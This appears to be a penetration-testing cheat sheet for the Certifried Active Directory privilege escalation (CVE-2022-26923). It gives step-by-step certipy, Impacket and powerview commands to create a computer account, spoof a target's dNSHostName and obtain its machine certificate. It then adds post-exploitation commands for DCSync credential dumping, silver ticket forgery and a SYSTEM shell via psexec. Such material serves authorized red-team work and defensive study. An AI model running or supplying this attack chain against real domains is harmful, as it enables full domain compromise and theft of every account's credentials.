# Certifried—AD DS Privilege Escalation (CVE-2022-26923)

## Theory

> [!Overview] Title
> **Certifried (CVE-2022-26923)** abuses pre–May 2022 certificate **mapping** behavior. 
> 
> A domain user who can create/control a computer account can clear its SPNs, set its `dNSHostName` to a **target host’s FQDN**, and request a **Machine** template certificate. 
> 
> The CA maps the cert to the spoofed `dNSHostName`, issuing a cert that **authenticates as the target machine** (including a DC). With this machine cert, you can obtain a TGT/NT hash and perform **DCSync** or forge **silver tickets**.

## Requirements

- AD/CA **not fully patched** for CVE-2022-26923 (weak/legacy mapping in effect). A telltale sign during testing is: `Certificate has no object SID` on issuance.
- Ability to **create** or **control** a computer account (default any domain user can create up to 10).
- Network reachability to DC/CA (RPC/Kerberos/LDAP).

### Placeholders

`<DOMAIN>` `<FOREST_DN>` `<DC_IP>` `<CA_NAME>` `<ADCS_HOST_FQDN>` `<USER>` `<PASS>` `<NEW_MACHINE>` `<NEW_MACHINE_PASS>` `<TARGET_HOST_FQDN>` `<PFX_FILE>` `<CCACHE_FILE>` `<NTHASH>` `<DOMAIN_SID>`

---

## Linux

### Quick Vulnerability Probe (weak mapping)

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -dc-ip <DC_IP> -template 'User'
# If output shows: "Certificate has no object SID" => no strong mapping, likely vulnerable
```

### Manual Path (Impacket + powerview.py)

#### 1) Create a computer account

```bash
addcomputer.py -computer-name '<NEW_MACHINE>$' -computer-pass '<NEW_MACHINE_PASS>' -dc-ip <DC_IP> '<DOMAIN>/<USER>':'<PASS>'
# Note: this adds no SPNs, so no cleanup needed
```

#### 2) (Optional) Identify target FQDN via certipy

```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -stdout -vulnerable
# Note the CA and target host DNS names; choose <TARGET_HOST_FQDN>
```

#### 3) Set `dNSHostName` of the new machine to the **target**

```bash
python3 powerview.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP>
PV > Set-DomainObject -Identity '<NEW_MACHINE>$' -Set dnsHostName="<TARGET_HOST_FQDN>"
# Expect: modified attribute dnshostname for CN=<NEW_MACHINE>,CN=Computers,....
```

#### 4) Request a **Machine** certificate as the spoofed machine

```bash
certipy req -u '<NEW_MACHINE>$' -p '<NEW_MACHINE_PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template 'Machine'
# Expect: Got certificate with DNS Host Name '<TARGET_HOST_FQDN>'
#         Certificate has no object SID
# Saves to '<PFX_FILE>' (e.g., dc.pfx)
```

#### 5) Authenticate with the issued certificate (PKINIT)

```bash
certipy auth -pfx '<PFX_FILE>'
# => Writes Kerberos ccache '<CCACHE_FILE>' and may print NT hash '<NTHASH>'
```

### One-Command Path (all-in certipy)

```bash
certipy account create -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -user <NEW_MACHINE> -dns <TARGET_HOST_FQDN>
# Outputs the generated password and sets dnsHostName to the target

certipy req -u '<NEW_MACHINE>$' -p '<NEW_MACHINE_PASS>' -ca '<CA_NAME>' -template 'Machine' -dc-ip <DC_IP>
# => PFX for '<TARGET_HOST_FQDN>' and no object SID

certipy auth -pfx '<PFX_FILE>'
```

---

## Post-Exploitation

### A) DCSync (if the target was a **DC**)

Using the **TGT/ccache**:

```bash
KRB5CCNAME=<CCACHE_FILE> secretsdump.py -k -no-pass <TARGET_HOST_FQDN>
# Dumps NTDS.DIT secrets (e.g., <DOMAIN>\\Administrator NT hash)
```

Using the **NT hash** directly:

```bash
secretsdump.py '<TARGET_HOST_FQDN_HOSTNAME>$'@<TARGET_HOST_FQDN> -hashes :<NTHASH>
```

### B) Silver Ticket (for non-DC machine certs)

1. Get **Domain SID**:

```bash
lookupsid.py '<TARGET_HOST_FQDN_HOSTNAME>$'@<DC_IP> -hashes :<NTHASH>
# Domain SID: <DOMAIN_SID>
```

2. Forge ticket for an SPN (e.g., CIFS):

```bash
ticketer.py -nthash <NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<TARGET_HOST_FQDN> Administrator
# => Administrator.ccache
```

3. Pass-the-Ticket:

```bash
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass <TARGET_HOST_FQDN>
# Expect SYSTEM shell
```

---

## Notes & Troubleshooting

* If `certipy req` for a user/template shows **no object SID**, strong mapping isn’t enforced — proceed.
* Ensure your created machine remains **SPN-light** before changing `dNSHostName` (Impacket’s `addcomputer.py` behavior helps). If SPNs exist, **clear FQDN-bound SPNs** before changing `dNSHostName`.
* If issuance fails, verify template name (`Machine`) and CA name `<CA_NAME>`; some environments customize template names.
* Kerberos name resolution matters: configure `/etc/hosts` or DNS for `<TARGET_HOST_FQDN>` when using tickets.
